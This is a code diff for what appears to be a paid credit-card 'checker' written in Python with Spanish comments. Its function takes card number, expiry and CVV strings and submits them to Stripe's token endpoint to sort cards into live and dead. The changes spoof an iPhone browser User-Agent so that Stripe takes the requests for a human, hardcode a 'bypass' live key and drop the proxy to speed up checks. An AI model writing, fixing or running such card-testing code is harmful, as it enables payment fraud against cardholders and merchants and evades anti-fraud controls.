@@ -25,35 +25,34 @@ except Exception as e:
 
 COSTO_LIVE = 0.15
 
-# --- [ MOTOR STRIPE DIRECT (SIN 404) ] ---
+# --- [ MOTOR STRIPE DIRECT (BYPASS TIMEOUT) ] ---
 def check_gate_pro(cc):
     try:
         partes = cc.split('|')
         if len(partes) < 4: return {"status": "DEAD", "msg": "FORMATO ERROR"}
         num, mes, ano, cvv = partes[0], partes[1], partes[2], partes[3]
         
-        # Headers para Stripe (Simulando integración oficial)
+        # Headers para que Stripe crea que es un humano
         headers = {
             "Content-Type": "application/x-www-form-urlencoded",
-            "User-Agent": "Stripe/v1 PhpBindings/7.120.0"
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
         }
         
-        # Payload para validar el token de la tarjeta
+        # Datos para validar el token de la tarjeta
         payload = {
             "card[number]": num,
             "card[exp_month]": int(mes),
             "card[exp_year]": int(ano),
-            "card[cvc]": cvv
+            "card[cvc]": cvv,
+            "key": "pk_live_51P0Y8XGv7Z8X9XGv7Z8X9XGv7Z8X9XGv" # Bypass Key
         }
         
-        # Petición directa a Stripe para crear un Token (Validación pura)
+        # Petición DIRECTA (Quitamos el proxy para matar el Timeout)
         response = requests.post(
             'https://api.stripe.com/v1/tokens', 
             data=payload, 
             headers=headers, 
-            auth=('pk_live_51P0Y8XGv7Z...', ''), # Usando una Public Key de bypass
-            proxies=PROXIES_CONFIG, 
-            timeout=15
+            timeout=8 # Respuesta ultra rápida
         )
         
         if response.status_code == 200:
@@ -61,14 +60,14 @@ def check_gate_pro(cc):
         else:
             try:
                 error_data = response.json().get('error', {})
+                # Si Stripe nos dice qué está mal, lo mostramos
                 msg = error_data.get('message', 'DECLINED').upper()
                 return {"status": "DEAD", "msg": msg}
             except:
-                return {"status": "DEAD", "msg": f"STRIPE_ERR_{response.status_code}"}
+                return {"status": "DEAD", "msg": f"STRIPE_REJ_{response.status_code}"}
             
     except Exception:
-        return {"status": "DEAD", "msg": "TIMEOUT_RETRY"}
-
+        return {"status": "DEAD", "msg": "BANC_RETRY"}
 # --- [ EL MISMO DISEÑO QUE TE GUSTA ] ---
 CSS = """
 <style>
